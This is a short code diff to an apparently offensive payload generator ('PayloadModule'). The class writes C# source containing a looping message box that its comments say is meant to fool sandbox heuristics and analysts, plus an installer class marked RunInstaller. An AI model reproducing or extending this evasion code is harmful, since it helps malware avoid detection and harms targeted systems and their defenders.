@@ -103,8 +103,8 @@ class PayloadModule:
         payload_code += "\t\tpublic static void Main()\n\t\t{\n"
         # lets add a message box to throw offf sandbox heuristics and analysts :)
         # there is no decryption routine, troll.level = 9000
-        # TODO: add a fake decryption function that does nothing and returns messWithAnalystName
-        payload_code += "\t\t\twhile(true)\n{{ MessageBox.Show(\"Decryption key: {0}\"); Console.ReadLine();}}\n".format(messWithAnalystName)
+        # TODO: add a fake decryption function that does nothing and accepts messWithAnalystName as a parameter.
+        payload_code += "\t\t\twhile(true)\n{{ MessageBox.Show(\"Encryption key: {0}\"); Console.ReadLine();}}\n".format(messWithAnalystName)
         payload_code += "\t\t}\n\t}\n\n"
         payload_code += "\t[System.ComponentModel.RunInstaller(true)]\n"
         payload_code += "\tpublic class {0} : System.Configuration.Install.Installer\n\t{{\n".format(classNameTwo)
